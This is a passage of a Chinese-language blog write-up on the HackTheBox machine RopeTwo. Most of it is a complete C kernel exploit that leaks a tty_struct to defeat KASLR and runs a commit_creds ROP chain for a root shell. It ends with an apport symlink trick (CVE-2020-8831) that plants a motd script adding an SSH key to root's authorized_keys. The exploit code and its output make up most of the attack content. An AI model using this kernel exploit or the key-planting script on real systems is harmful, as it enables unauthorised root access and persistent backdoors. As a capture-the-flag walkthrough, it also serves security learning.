class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdint.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/ioctl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"></span><br><span class="line">int fd, ptmx;</span><br><span class="line"></span><br><span class="line">struct user_data_struct &#123;</span><br><span class="line">    uint64_t <span class="built_in">id</span>;</span><br><span class="line">    uint64_t size;</span><br><span class="line">    void* data;</span><br><span class="line">&#125; user_data;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">long create_buf(uint64_t <span class="built_in">id</span>, uint64_t size)&#123;</span><br><span class="line">    user_data.id = <span class="built_in">id</span>;</span><br><span class="line">    user_data.size = size;</span><br><span class="line">    <span class="built_in">return</span> ioctl(fd, 0x1000, &amp;user_data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">long delete_buf(uint64_t <span class="built_in">id</span>) &#123;</span><br><span class="line">    user_data.id = <span class="built_in">id</span>;</span><br><span class="line">    <span class="built_in">return</span> ioctl(fd, 0x1001, &amp;user_data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">long write_buf(uint64_t <span class="built_in">id</span>, uint64_t size, void *data)&#123;</span><br><span class="line">    user_data.id = <span class="built_in">id</span>;</span><br><span class="line">    user_data.size = size;</span><br><span class="line">    user_data.data = data;</span><br><span class="line">    <span class="built_in">return</span> ioctl(fd, 0x1002, &amp;user_data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">long read_buf(uint64_t <span class="built_in">id</span>, uint64_t size, void *data)&#123;</span><br><span class="line">    user_data.id = <span class="built_in">id</span>;</span><br><span class="line">    user_data.size = size;</span><br><span class="line">    user_data.data = data;</span><br><span class="line">    <span class="built_in">return</span> ioctl(fd, 0x1003, &amp;user_data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void <span class="function"><span class="title">shell</span></span>() &#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        puts(<span class="string">&quot;[-] Failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(-1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(int argc) &#123;</span><br><span class="line"></span><br><span class="line">    int i, <span class="built_in">id</span>;</span><br><span class="line">    int ptmx;</span><br><span class="line">    uint64_t *output = malloc(0x420);</span><br><span class="line">    uint64_t kernel_base;</span><br><span class="line">    </span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ralloc&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd == -1) &#123;</span><br><span class="line">        fprintf(stderr, <span class="string">&quot;Failed to open /dev/ralloc&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span> -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_base = 0;</span><br><span class="line">    <span class="keyword">while</span>(kernel_base == 0) &#123;</span><br><span class="line">        // Clear buffers  </span><br><span class="line">        <span class="keyword">for</span>(i=0; i &lt; 0x20; i++)&#123;</span><br><span class="line">            delete_buf(i);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        // Loop over buffers, create, open ptmx, check <span class="keyword">for</span> tty_struct</span><br><span class="line">        <span class="keyword">for</span>(i=0; i &lt; 0x20; i++)&#123;</span><br><span class="line">            create_buf(i, 0x400); </span><br><span class="line">            ptmx = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line"></span><br><span class="line">            read_buf(i, 0x420, output);</span><br><span class="line">            <span class="keyword">if</span>((output[<span class="number">0</span>x80] &amp; <span class="number">0</span>xffffffff) == <span class="number">0</span>x5401 &amp;&amp;</span><br><span class="line">               (output[<span class="number">0</span>x83] &amp; <span class="number">0</span>xfff) == <span class="number">0</span>x6a0) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            close(ptmx); // close if not found</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (i == <span class="number">0</span>x20)&#123;</span><br><span class="line">            printf(&quot;[-] Failed to find tty_struct. Try again.\n&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            uint64_t ptm_unix98_ops = output[<span class="number">0</span>x83];</span><br><span class="line">            printf(&quot;[+] Identified ptm_unix98_ops address: %<span class="number">016</span>lx\n&quot;, ptm_unix98_ops);</span><br><span class="line">            kernel_base = ptm_unix98_ops - <span class="number">0</span>x10af6a0;</span><br><span class="line">            printf(&quot;[+] Identified kernel base address:    %<span class="number">016</span>lx\n&quot;, kernel_base);</span><br><span class="line">            id = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf(&quot;[*] Using slot %i\n&quot;, id);</span><br><span class="line"></span><br><span class="line">    // Stack Pivot</span><br><span class="line">    size_t xchg_esp_eax = <span class="number">0</span>x368c08 + kernel_base;</span><br><span class="line">    uint64_t *fake_tty_ops = malloc(<span class="number">248</span>);</span><br><span class="line">    fake_tty_ops[<span class="number">4</span>] = xchg_esp_eax;</span><br><span class="line">    output[<span class="number">0</span>x83] = (uint64_t)fake_tty_ops;</span><br><span class="line">    write_buf(id, <span class="number">0</span>x420, output);</span><br><span class="line"></span><br><span class="line">    uint64_t new_stack = xchg_esp_eax &amp; <span class="number">0</span>xffffffff;</span><br><span class="line">    uint64_t *st_ptr = new_stack;</span><br><span class="line">    int st_idx = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    // Set Permissions</span><br><span class="line">    mmap((void *)(new_stack &amp; <span class="number">0</span>xfffff000), <span class="number">0</span>x1000, PROT_READ|PROT_WRITE|PROT_EXEC,</span><br><span class="line">        MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    // Offsets</span><br><span class="line">    uint64_t ret = <span class="number">0</span>x0001cc + kernel_base;</span><br><span class="line">    uint64_t pop_rdi = <span class="number">0</span>x08b8a0 + kernel_base;</span><br><span class="line">    uint64_t prepare_kernel_cred = <span class="number">0</span>x0c07a0 + kernel_base;</span><br><span class="line">    uint64_t pop_r8 = <span class="number">0</span>x4875b2 + kernel_base;</span><br><span class="line">    uint64_t pop_rdx = <span class="number">0</span>x03bbc2 + kernel_base;</span><br><span class="line">    uint64_t mov_rax_rdi_cmp_pop_rbp = <span class="number">0</span>x12e597 + kernel_base;</span><br><span class="line">    uint64_t commit_creds = <span class="number">0</span>x0c0540 + kernel_base;</span><br><span class="line">    uint64_t swapgs_pop_rbp = <span class="number">0</span>x074b54 + kernel_base;</span><br><span class="line">    uint64_t pop_rcx = <span class="number">0</span>x405ea6 + kernel_base;</span><br><span class="line">    uint64_t pop_r11 = <span class="number">0</span>x54c2d5 + kernel_base;</span><br><span class="line">    uint64_t sysretq = <span class="number">0</span>x075444 + kernel_base;</span><br><span class="line"></span><br><span class="line">    // ROP</span><br><span class="line">    st_ptr[st_idx++] = ret;</span><br><span class="line">    st_ptr[st_idx++] = pop_rdi;</span><br><span class="line">    st_ptr[st_idx++] = <span class="number">0</span>;</span><br><span class="line">    st_ptr[st_idx++] = prepare_kernel_cred;</span><br><span class="line"></span><br><span class="line">    st_ptr[st_idx++] = pop_r8;</span><br><span class="line">    st_ptr[st_idx++] = <span class="number">0</span>;</span><br><span class="line">    st_ptr[st_idx++] = pop_rdx;</span><br><span class="line">    st_ptr[st_idx++] = <span class="number">0</span>;</span><br><span class="line">    st_ptr[st_idx++] = mov_rax_rdi_cmp_pop_rbp;</span><br><span class="line">    st_ptr[st_idx++] = <span class="number">0</span>;</span><br><span class="line">    st_ptr[st_idx++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    st_ptr[st_idx++] = swapgs_pop_rbp;</span><br><span class="line">    st_ptr[st_idx++] = <span class="number">0</span>;</span><br><span class="line">    st_ptr[st_idx++] = pop_rcx;</span><br><span class="line">    st_ptr[st_idx++] = &amp;shell;</span><br><span class="line">    st_ptr[st_idx++] = pop_r11;</span><br><span class="line">    st_ptr[st_idx++] = <span class="number">0</span>x0;</span><br><span class="line">    st_ptr[st_idx++] = sysretq;</span><br><span class="line"></span><br><span class="line">    // trigger ROP</span><br><span class="line">    printf(&quot;[*] Triggering ROP\n&quot;);</span><br><span class="line">    close(ptmx);</span><br><span class="line">    printf(&quot;[-] Exploit failed.\n&quot;);</span><br><span class="line">    return <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有时候会失败，但多运行它几次似乎会get shell:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali<span class="comment"># gcc -w -o exploit exploit.c ; scp -i id_rsa exploit r4j@10.10.10.196:/tmp/exp</span></span><br><span class="line">exploit                        100%   17KB 532.3KB/s   00:00 </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">r4j@rope2:/tmp$ ./exp</span><br><span class="line">[+] Identified ptm_unix98_ops address: ffffffffa1caf6a0</span><br><span class="line">[+] Identified kernel base address:    ffffffffa0c00000</span><br><span class="line">[*] Using slot 1</span><br><span class="line">[*] Triggering ROP</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># cat /root/root.txt</span></span><br><span class="line">13153a2c6742569c92f7c15be2e249e5</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot3.jpg"></li>
</ul>
<h2 id="Extra-非预期获取root的方法"><a href="#Extra-非预期获取root的方法" class="headerlink" title="Extra - 非预期获取root的方法"></a>Extra - 非预期获取root的方法</h2><h3 id="寻找漏洞"><a href="#寻找漏洞" class="headerlink" title="寻找漏洞"></a>寻找漏洞</h3><p>第一个解决这个问题的团队使用了一条被HTB团队迅速修补的意外路径。他们发现的漏洞让他们从chromeuser转到一个漏洞的root。这个团队的一个成员jkr帮助重新创建了这个漏洞。</p>
<p>这个box于2020年6月27日发布。在apt日志中，两天后的6月29日，apport被删除了:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@rope2:/var/log/apt<span class="comment"># zcat history.log.1.gz </span></span><br><span class="line"></span><br><span class="line">Start-Date: 2020-06-03  12:00:07</span><br><span class="line">Commandline: apt install ifupdown</span><br><span class="line">Install: ifupdown:amd64 (0.8.35ubuntu1)</span><br><span class="line">End-Date: 2020-06-03  12:00:09</span><br><span class="line"></span><br><span class="line">Start-Date: 2020-06-29  18:40:31</span><br><span class="line">Commandline: apt purge apport</span><br><span class="line">Purge: apport:amd64 (2.20.10-0ubuntu27.3)</span><br><span class="line">End-Date: 2020-06-29  18:40:33</span><br></pre></td></tr></table></figure>

<p>删除的版本是2.20.10-0ubuntu27.3。一些谷歌搜索显示<span class="exturl" data-url="aHR0cHM6Ly9jdmUubWl0cmUub3JnL2NnaS1iaW4vY3ZlbmFtZS5jZ2k/bmFtZT1DVkUtMjAyMC04ODMx">CVE-2020-8831<i class="fa fa-external-link-alt"></i></span>。现在作为RopeTwo上的root用户，可以重新配置机器，使其再次受到此路径的攻击。</p>
<h2 id="安装旧的apport"><a href="#安装旧的apport" class="headerlink" title="安装旧的apport"></a>安装旧的apport</h2><p>apport是一个用来<span class="exturl" data-url="aHR0cHM6Ly93aWtpLnVidW50dS5jb20vQXBwb3J0">拦截崩溃并记录信息<i class="fa fa-external-link-alt"></i></span>的程序，这样就可以在不重新创建崩溃的情况下进行调试&#x2F;故障排除。</p>
<p>要安装这个较旧的、易受攻击的apport版本，将使用apt。需要首先修复更新源文件:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@rope2:~<span class="comment"># cat /etc/apt/sources.list</span></span><br><span class="line">deb http://old-releases.ubuntu.com/ubuntu disco main universe multiverse restricted</span><br><span class="line">deb http://old-releases.ubuntu.com/ubuntu disco-updates main universe multiverse restricted</span><br></pre></td></tr></table></figure>

<p>因为RopeTwo机器不能直接与互联网通信，将通过我的burpsuite代理apt。在本地机器上更改了Burp，这样它就可以监听所有接口，而不仅仅是localhost:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*:8080</span><br></pre></td></tr></table></figure>

<p>还将设置http_proxy环境变量来告诉apt使用这个代理:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@rope2:~<span class="comment"># export http_proxy=http://10.10.14.14:8080</span></span><br></pre></td></tr></table></figure>

<p>现在运行apt update，然后apt install apport&#x3D;2.20.10-0ubuntu27.3。</p>
<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>这里的漏洞利用了apport写入&#x2F;var&#x2F;lock目录的方式。该目录可由任何用户写入:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chromeuser@rope2:~$ <span class="built_in">ls</span> -ld /var/lock/</span><br><span class="line">drwxrwxrwt 4 root root 80 Jan 15 16:27 /var/lock/</span><br></pre></td></tr></table></figure>

<p>当出现segfaults时，apport将在该文件夹中创建一个目录apport，其中包含一个文件lock。漏洞在于它如何处理符号链接。将创建一个链接，将&#x2F;var&#x2F;lock&#x2F;apport指向想写入的目录，如&#x2F;etc&#x2F;update-motd。d(在前面的回溯中已经展示了如何对这个目录进行写操作)。如果可以在该文件夹中获得一个可以写入的文件，然后使用ssh或su登录，那么它将以root身份运行。</p>
<h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><p>作为chromeuser在以root用户重新安装apport后，进入&#x2F;var&#x2F;lock。目前没有apport目录:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chromeuser@rope2:/var/lock$ <span class="built_in">ls</span></span><br><span class="line">lvm  subsys</span><br></pre></td></tr></table></figure>

<p>创建一个符号链接:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chromeuser@rope2:/var/lock$ <span class="built_in">ln</span> -s /etc/update-motd.d apport</span><br><span class="line">chromeuser@rope2:/var/lock$ <span class="built_in">ls</span> -l</span><br><span class="line">total 0</span><br><span class="line">lrwxrwxrwx 1 chromeuser chromeuser 18 Jan 15 19:01 apport -&gt; /etc/update-motd.d</span><br><span class="line">drwx------ 2 root       root       40 Jan 15 18:52 lvm</span><br><span class="line">drwxr-xr-x 2 root       root       40 Jan 15 18:52 subsys</span><br></pre></td></tr></table></figure>

<p>现在需要crash个东西。可以再次运行heap攻击，或者用信号11杀死某些东西</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chromeuser@rope2:/var/lock$ <span class="built_in">sleep</span> 100000 &amp;</span><br><span class="line">[1] 3574</span><br><span class="line">chromeuser@rope2:/var/lock$ <span class="built_in">kill</span> -11 3574</span><br><span class="line">[1]+  Segmentation fault      (core dumped) <span class="built_in">sleep</span> 100000</span><br></pre></td></tr></table></figure>

<p>这会在&#x2F;etc&#x2F;update-motd.d中创建一个新文件，最后一个，lock:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">chromeuser@rope2:/etc/update-motd.d$ <span class="built_in">ls</span> -l</span><br><span class="line">total 40</span><br><span class="line">-rwxr-xr-x 1 root root 1220 Aug  6  2018 00-header</span><br><span class="line">-rwxr-xr-x 1 root root 1157 Aug  6  2018 10-help-text</span><br><span class="line">lrwxrwxrwx 1 root root   46 Apr 16  2019 50-landscape-sysinfo -&gt; /usr/share/landscape/landscape-sysinfo.wrapper</span><br><span class="line">-rwxr-xr-x 1 root root 4264 Aug 21  2018 50-motd-news</span><br><span class="line">-rwxr-xr-x 1 root root   97 Apr  9  2018 90-updates-available</span><br><span class="line">-rwxr-xr-x 1 root root  299 Aug 10  2018 91-release-upgrade</span><br><span class="line">-rwxr-xr-x 1 root root  129 Apr  9  2018 95-hwe-eol</span><br><span class="line">-rwxr-xr-x 1 root root  111 Nov 13  2018 97-overlayroot</span><br><span class="line">-rwxr-xr-x 1 root root  142 Apr  9  2018 98-fsck-at-reboot</span><br><span class="line">-rwxr-xr-x 1 root root  144 Apr  9  2018 98-reboot-required</span><br><span class="line">-rwxrwxrwx 1 root root    0 Jan 15 19:02 lock</span><br></pre></td></tr></table></figure>

<p>注意，它是world writable。</p>
<p>已经在&#x2F;home&#x2F;chromeuser&#x2F;.ssh&#x2F;authorized_keys中有公钥。将使用这个Bash脚本复制到&#x2F;root&#x2F;.ssh&#x2F;authorized_keys:</p>
<ul>
<li>getroot.sh</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;pwned!&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> /root/.ssh</span><br><span class="line"><span class="built_in">cat</span> /home/chromeuser/.ssh/authorized_keys &gt;&gt; /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<p>现在将SSH作为chromeuser再次触发MOTD脚本:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@kali<span class="comment"># ssh -i ~/keys/ed25519_gen chromeuser@10.10.10.196</span></span><br><span class="line">Welcome to Ubuntu 19.04 (GNU/Linux 5.0.0-38-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Fri Jan 15 19:07:21 UTC 2021</span><br><span class="line"></span><br><span class="line">  System load:  0.31               Processes:             317</span><br><span class="line">  Usage of /:   41.7% of 19.56GB   Users logged <span class="keyword">in</span>:       3</span><br><span class="line">  Memory usage: 29%                IP address <span class="keyword">for</span> ens160: 10.10.10.196</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">71 updates can be installed immediately.</span><br><span class="line">0 of these updates are security updates.</span><br><span class="line"></span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwned!</span><br><span class="line">Last login: Fri Jan 15 19:05:14 2021 from 10.10.14.14</span><br><span class="line">chromeuser@rope2:~$</span><br></pre></td></tr></table></figure>

<p>它上面写着“pwned!”就在提示符上方显示漏洞生效了。可以以root身份SSH连接:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@kali<span class="comment"># ssh -i ~/keys/ed25519_gen root@10.10.10.196</span></span><br><span class="line">Welcome to Ubuntu 19.04 (GNU/Linux 5.0.0-38-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Fri Jan 15 19:08:09 UTC 2021</span><br><span class="line"></span><br><span class="line">  System load:  0.26               Processes:             322</span><br><span class="line">  Usage of /:   41.7% of 19.56GB   Users logged <span class="keyword">in</span>:       3</span><br><span class="line">  Memory usage: 29%                IP address <span class="keyword">for</span> ens160: 10.10.10.196</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">71 updates can be installed immediately.</span><br><span class="line">0 of these updates are security updates.</span><br><span class="line"></span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwned!</span><br><span class="line">Last login: Fri Jan 15 19:05:25 2021 from 10.10.14.14</span><br><span class="line">root@rope2:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<ul>
<li>That’s all, Thanks for watching…</li>
</ul>
<p><font color="red"><em><strong>Damn! Really a Journey to the Hell! Ha?</strong></em></font></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="fdvoid0 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="fdvoid0 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>fdvoid0
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://fdlucifer.github.io/2021/02/27/hackthebox-rope2-getroot/" title="HackTheBox-RopeTwo-[ralloc-KASLR-kernel-ROP]">https://fdlucifer.github.io/2021/02/27/hackthebox-rope2-getroot/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
      </div>

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="/images/wechat_channel.jpg">
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
            <span class="icon">
              <i class="fa fa-stack-exchange"></i>
            </span>

            <span class="label">infosec.exchange</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2021/02/23/breadcrumbs/" rel="prev" title="Hack-The-Box-walkthrough[Breadcrumbs]">
                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[Breadcrumbs]
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2021/03/01/spectra/" rel="next" title="Hack-The-Box-walkthrough[Spectra]">
                  Hack-The-Box-walkthrough[Spectra] <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2017 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">fdvoid0</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>Word count total: </span>
    <span title="Word count total">657k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
